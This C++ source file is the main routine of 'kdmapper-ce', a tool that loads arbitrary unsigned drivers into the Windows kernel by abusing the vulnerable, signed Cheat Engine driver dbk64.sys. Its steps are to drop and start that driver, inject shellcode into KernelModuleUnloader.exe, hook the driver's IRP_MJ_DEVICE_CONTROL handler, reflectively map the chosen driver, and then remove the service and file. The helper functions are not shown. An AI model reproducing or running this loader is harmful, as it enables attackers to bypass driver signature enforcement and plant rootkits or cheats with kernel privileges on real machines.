#include "main.h"


int wmain(const int argc, wchar_t** argv) {

	wchar_t DriverFullPath[MAX_PATH] = { 0 };
	const wchar_t* DriverName = argv[1];
	HANDLE hDriver = NULL;
	HANDLE dbk64_device_handle = NULL;
	NTSTATUS exitCode = 0;

	utils::KdmapperInit();

	Log2("Debug Mode Enable");

	// Load the file given as command line argument into memory.

	if (argc < 2) {
		Error("Usage: kdmapper-ce.exe <driver_path>");
		return -1;
	}

	if (!_wfullpath(DriverFullPath, DriverName, MAX_PATH)) {
		Error("_wfullpath failed");
		return -1;
	}

	hDriver = utils::ReadFileToMemory(DriverFullPath);
	if (hDriver == INVALID_HANDLE_VALUE) {
		Error("ReadFileToMemory failed");
		return -1;
	}

	// Drop the dbk64.sys file to disk with a random name to create and start the service.

	if (!ce_driver::Load()) {
		Error("ce_driver::Load() failed");
		return -1;
	}

	do {

		//  Inject shellcode into KernelModuleUnloader.exe process and get device handle of dbk64.sys

		Log("Injecting shellcode into KernelModuleUnloader.exe process to get device handle of Dbk64.sys...");
		
		dbk64_device_handle = kdmapper_ce::GetDbk64DeviceHandle();
		if (dbk64_device_handle == INVALID_HANDLE_VALUE) {
			Error("kdmapper_ce::GetDbk64DeviceHandle failed");
			break;
		}

		// Patch IRP_MJ_DEVICE_CONTROL in Dbk64.sys, and
		// Hook it with alternate code to load the driver.
		
		Log("Patching IRP_MJ_DEVICE_CONTROL in Dbk64.sys driver to hook IRP...");
		
		if (!kdmapper_ce::PatchMajorFunction(dbk64_device_handle)) {
			Error("kdmapper_ce::PatchMajorFunction failed");
			break;
		}
		
		Log("Ready, load  the input driver...");
		
		// Reflective load of the input driver into kernel space.

		if (!kdmapper_ce::MapDriver(dbk64_device_handle, hDriver, &exitCode)) {
			Error("Failed to map %ls", DriverName);
			break;
		}

		if (NT_SUCCESS(exitCode)) {
			Log("Successfully executed driver entry (exitCode: %d)", exitCode);
		}
		else {
			Error("Failed to execute driver entry (exitCode: %d)", exitCode);
		}
		
	} while (FALSE);

	// Stop and delete dbk64.sys service

	if (!service::StopAndRemove(ce_driver::GetDriverNameW())) {
		Error("Failed to stop and remove service for the vulnerable driver");
		_wremove(ce_driver::GetDriverPath().c_str());
		return -1;
	}

	return 0;
}	